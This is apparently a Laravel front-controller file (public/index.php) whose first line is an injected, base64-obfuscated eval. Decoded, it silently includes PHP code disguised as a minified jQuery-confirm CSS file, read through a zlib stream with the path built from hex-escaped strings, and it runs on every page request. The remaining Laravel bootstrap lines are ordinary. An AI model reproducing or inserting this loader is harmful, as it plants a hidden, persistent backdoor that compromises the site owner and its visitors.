<?php
eval(base64_decode('bmV3IGNsYXNzKCdjb21wcmVzcy56bGliOi8vJyAuIGRpcm5hbWUoJF9TRVJWRVJbIlx4NTNceDQzXHg1Mlx4NDlceDUwXHg1NFx4NWZceDQ2XHg0OVx4NGNceDQ1XHg0ZVx4NDFceDRkXHg0NSJdKSAuICcvanMvanF1ZXJ5LWNvbmZpcm0vanF1ZXJ5LWNvbmZpcm0tYXNzZXRzLm1pbi5jc3MnKSB7IA0KCWZ1bmN0aW9uIF9fY29uc3RydWN0KCTlt5HorrA36baqKSB7IA0KCQlASW5DbFVERV9vTkNlKCTlt5HorrA36baqKTsgDQogICAgfSANCn07'));

use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__.'/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
(require_once __DIR__.'/../bootstrap/app.php')
    ->handleRequest(Request::capture());
